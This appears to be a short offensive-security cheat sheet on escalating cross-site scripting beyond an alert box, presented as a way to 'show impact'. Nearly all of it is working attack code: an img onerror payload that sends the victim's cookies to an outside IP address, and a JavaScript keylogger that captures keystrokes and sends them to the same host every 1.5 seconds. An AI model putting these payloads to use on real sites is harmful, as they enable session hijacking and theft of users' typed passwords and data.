# Beyond alert
Going beyond the alert('xss')

## Info

After getting your xss alert box, what's next? This is not usually enough to "show impact", so on the good stuff!

## Techniques (code)

- Cookie Stealer
```js
<img src=x onerror=this.src='http://5.5.5.5/?cookie='+document.cookie>
```



- Record key stokes
  Add this to a js file
  ```js
  var data = '';
  document.onkeypress = function(e) {
    var w = window.event ? event : e;
    var keystroke = w.keyCode ? w.keyCode : w.charCode;
    keystroke = String.fromCharCode(keystroke);
    data = data + keystroke;
  }
  window.setInterval(function(){
      new Image().src = 'http://5.5.5.5/?c=' + data;
      data = '';
  }, 1500);
  ```
